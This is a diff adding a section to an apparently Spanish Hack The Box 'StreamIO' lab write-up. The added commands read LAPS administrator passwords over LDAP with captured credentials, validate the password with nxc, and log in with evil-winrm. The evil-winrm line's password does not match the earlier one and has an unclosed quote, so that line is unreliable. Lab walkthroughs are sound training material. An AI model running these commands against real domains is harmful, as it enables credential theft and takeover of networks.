@@ -493,5 +493,20 @@ Add-DomainGroupMember 'Core Staff' -Members 'JDgodd' -Credential $Cred
 ```
 
 Ahora ya podemos listar los LAPS
+```shell
+ldapsearch -x -H ldap://10.129.13.82 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b "dc=streamio,dc=htb" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+```
+
+Obteniendo una contraseña del usuario administrador
+La validamos
+```shell
+nxc smb 10.129.13.82 -u 'administrator' -p 'A!Y#!,/.[&)0g['
+```
+
+Y nos conectamos
+```shell
+evil-winrm -i 10.129.13.82 -u 'administrator' -p 'A,/.[&)0g[
+```
+
 
 
